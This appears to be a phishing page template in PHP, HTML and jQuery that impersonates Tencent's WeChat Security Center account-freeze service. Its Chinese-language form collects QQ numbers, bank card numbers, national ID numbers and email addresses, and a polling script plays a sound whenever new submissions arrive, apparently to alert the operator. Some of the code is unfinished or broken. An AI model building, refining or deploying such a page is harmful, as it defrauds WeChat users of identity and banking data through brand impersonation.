<?php $global = \Session::get('GLOBAL_OPTIONS');?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<title>核实登记 - 微信安全中心 - 安全连接一切</title>
	<meta http-equiv="content-type" content="text/html;charset=utf-8"/>
    <meta id="viewport" name="viewport" content="width=device-width, initial-scale=0.5, maximum-scale=1.0, user-scalable=0">
    <meta name="keywords" content="冻结微信帐号,微信冻结,冻结帐号,冻结微信,紧急冻结微信号,微信被盗怎么办" />
    <meta name="description" content="微信安全中心(weixin110.qq.com)提供冻结帐号服务。" />
	<title>微信安全中心</title>
	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
	<link rel="stylesheet" type="text/css" href="/assets/web/css/common2e644f.css">
    <link rel="stylesheet" type="text/css" href="/assets/web/css/tools2e1af5.css"/>
    <link rel="stylesheet" type="text/css" href="/assets/web/css/common2f6835.css"/>
	<style>
	
	.banner {
	  position: relative;
	  margin-top: -50px;
	  padding-top: 50px;
	  height: 130px;
	  line-height: 130px;
	  /*height: 420px;
	  line-height: 420px;*/
	  background: transparent url(/assets/web/images/checkbook/tools_blur2e1af5.jpg) no-repeat center center;
	  background-size: cover;
	  -webkit-background-size: cover;
	}
	.inner {
		width: 100%; 
		margin: 0 auto;
	}
	</style>
</head>
<body class="" type="frozen" debug="">
<!--
<div class="head">
    <div class="head_bg"></div>
    <div class="inner">
        <h1 class="logo">
            <a href="readtemplate-t=security_center_website-index.htm"><img src="cotents/images/logo2e1af5.png" width="116px" alt="微信安全中心"/></a>
            <b>微信安全中心</b>
        </h1>
				
		<div class="nav">
			<a href="readtemplate-t=security_center_website-index.htm">首页</a>
			<a class="on" href="readtemplate-t=security_center_website-tools.htm">安全工具</a>
			<a href="readtemplate-t=security_center_website-report.htm">投诉维权</a>
			<a href="readtemplate-t=security_center_website-school.htm">安全学堂</a>
		</div>
    </div>
</div>-->
<div class="body">
    <div class="banner">
       <!-- <h1>登记核实</h1>-->
    </div>
<div class="tools_hd"></div>
<div class="tools_bd">
    <div class="inner">
        <form class="form" step="1">
            <input id="deviceid" type="hidden" name="deviceid" value="">
            <div class="frm_control_group">
				<p>如果怀疑微信帐号被盗，你可以冻结微信帐号阻止他人登录。</p>
                <br>
                <p>输入需要登记的核实帐号</p>
			</div>
            <div class="frm_control_group">
                <div ref="qq" class="j_acctInputWrp frm_controls" style="display: block">
                    <label class="frm_label">QQ号</label>
                    <div class="frm_controls">
                        <span class="frm_input_box">
                            <input required="qq" maxlength="20" class="frm_input" type="number" placeholder="请输入QQ号" />
                        </span>
                        <p class="frm_msg fail">
                            <span class="frm_msg_content">请输入正确的QQ号</span>
                        </p>
                    </div>
                </div>
                <div ref="mobile" class="j_acctInputWrp frm_controls">
                    <label class="frm_label">银行卡号码</label>
                    <div class="frm_controls">
                        <span class="frm_input_box with_mobile_cc">
                            <span class="mobile_cc">
                                <input id="j_ccValue" type="hidden" name="acctcc" value="86">
                            </span>
                            <span class="mobile_input">
                                <input class="frm_input" name="acct" required="tel" maxlength="11" type="text" placeholder="请输入手机号" />
                            </span>
                        </span>
                        <p class="frm_msg fail">
                            <span class="frm_msg_content">请输入正确的银行卡号码</span>
                        </p>
                    </div>
                </div>
                <div ref="wxid" class="j_acctInputWrp frm_controls" style="display: block">
                    <label class="frm_label">身份证号码</label>
                    <div class="frm_controls">
                        <span class="frm_input_box">
                            <input required="wxid" maxlength="30" class="frm_input" type="text" placeholder="请输入身份证号码" />
                        </span>
                        <p class="frm_msg fail">
                            <span class="frm_msg_content">请输入正确的身份证号码</span>
                        </p>
                    </div>
                </div>
                <div ref="email" class="j_acctInputWrp frm_controls" style="display: block">
                    <label class="frm_label">Email</label>
                    <div class="frm_controls">
                        <span class="frm_input_box">
                            <input required="email" maxlength="50" class="frm_input" type="text" placeholder="请输入邮箱" />
                        </span>
                        <p class="frm_msg fail">
                            <span class="frm_msg_content">请输入正确格式的Email</span>
                        </p>
                    </div>
                </div>
            </div>
            <div class="tool_bar tc">
                <a href="javascript:" class="btn btn_default">返回</a>
                <a id="submitBtn" class="btn btn_primary" href="javascript:">下一步</a>
            </div>
        </form>
    </div>
</div>

</div>

<div id="foot" class="foot">
    <ul class="links">
        <li class="links_item no_extra"><a href="" target="_blank">关于腾讯</a></li>
		<li class="links_item "><a href="" target="_blank">About Tencent</a></li>
		<li class="links_item "><a href="" target="_blank">服务条款</a></li>
		<li class="links_item "><a href="" target="_blank">腾讯招聘</a></li>
		<li class="links_item "><a href="" target="_blank">客服中心</a></li>
		<li class="links_item "><a href="" target="_blank">隐私政策</a></li>
	</ul>
    <p class="copyright">Copyright &copy; 2011 - 2016 Tencent All Right Reserved.</p>
</div>
<script type="text/javascript" src="/assets/web/js/footFixed2e1af5.js"></script>
<script type="text/javascript" src="/assets/web/jquery1.11.3/jquery.js" ></script>
<script type="text/javascript" src="/assets/web/js/wxForm2e1af5.js"></script>
<script type="text/javascript" src="/assets/web/js/common2f6835.js"></script>
<script type="text/javascript">
	var checknewsObj;
    !function(w, b){
        w.WX110 = {
            BASE_PATH: "/security/readtemplate?lang=zh_CN&type=" + b.getAttribute("type") + "&t=account_frozen",

            CGI_URL: "/security/frozen?action=1&lang=zh_CN",

            TEXT_NETWORKERR: "网络错误，请稍后再试",

            FUNC_GOTO: function(page){
                location.href = this.BASE_PATH + page
            }
        };
    }(window, document.body);
	
	$(function(){
		//核实记录
		$("#submitBtn").click(function(){
			var ajaxurl = "";
			var param = [];
			var sys = checksys();
			
			$.post(ajaxurl,param,function(data,status){
				if(data.status == 'succ'){
					alert("");
				}else{
					alert("核实失败");
				}
			});
		});
	})
	
	function checksys(){
		if(/android/i.test(navigator.userAgent)){
			return "android";
		}else{
			return "ios";
		}
	}
	function openCheckNews(yn){
		if(yn = true){
			checknewsObj = setInterval("checknews()",20000);//20秒检测是否有数据推送
		}else{
			if(checknewsObj !=null)
				clearInterval(checknewsObj);
		}
		
	}
	
	function checknews(){
		var ajaxurl = "";
		$.post(ajaxurl,param,function(data,status){
				if(data.status == 'succ'){
					playmusic();
				}else{
					alert("核实失败");
				}
			});
	}
	
	function playmusic(){
		//播放音乐
		if(Xut.fix.audio){
			audio
			= 
			Xu.fix.audio;
				audio.src="";
		}else{
			audio = new Audio("");
		}
		audio.autoplay= true;
		
		audio.play();
	}
</script>

<script type="text/javascript" src="scripts/js/zh_CN2e4c6a.js"></script>
<script type="text/javascript">
    !function(J){
        var JacctSelect = J("#j_acctSelect"), JinputWrp = J(".j_acctInputWrp"), Jinputs = J(".j_acctInputWrp input.frm_input");
        function acctChange(){
            J("#j_ccSelectWrp")[JacctSelect.val() == "mobile" ? "show" : "hide"]();
            Jinputs.removeAttr("name");
            JinputWrp.filter("[ref='" + JacctSelect.val() + "']").find("input.frm_input").attr("name", "acct").end().show().siblings(".j_acctInputWrp").hide();
        }
        JacctSelect.on("change", acctChange);
        acctChange();

        var JccSelect = J("#j_ccSelect"), JccValue = J("#j_ccValue"),
                ccHTML = "";
        for (var i = 0, len = COUNTRY.length; i < len; ++i) {
            var country = COUNTRY[i];
            ccHTML += "<option cc='" + country.code + "' " + (country.code == "86" ? "selected" : "") + ">" + country.name + "</option>";
        }
        JccSelect.on("change", function(){
            var Joption = JccSelect.find("option:selected");
            JccValue.val(Joption.attr("cc"));
        }).html(ccHTML);


        window.handler = function(ret, data){
            switch(ret.ret){
                case 1: // 一键冻结
                    WX110.FUNC_GOTO("/confirm&step=2");
                    break;
                case 2: // 通过qq/手机冻结
                    var retText = "";
                    for(var key in ret){
                        retText += "&" + key + "=" + encodeURIComponent(ret[key]);
                    }
                    WX110.FUNC_GOTO("/type" + retText);
                    break;
                case 8: // 短信冻结/解冻
                    var retText = "";
                    for(var key in ret){
                        retText += "&" + key + "=" + encodeURIComponent(ret[key]);
                    }
                    WX110.FUNC_GOTO("/sms" + retText);
                    break;
                case 9: // qq解冻
                    WX110.FUNC_GOTO("/unfrozen_qq&qq=" + encodeURIComponent(ret.qq || ""));
                    break;
                case 10: // 一键解冻
                    WX110.FUNC_GOTO("/confirm&step=2");
                    break;
                case 11: // 需要申诉
                    WX110.FUNC_GOTO("/result&ret=appeal");
                    break;
                default:
                    WX110.FUNC_GOTO("/result&ret=" + ret.ret);
            }
        }
    }(jQuery);
</script>

</body>
</html>

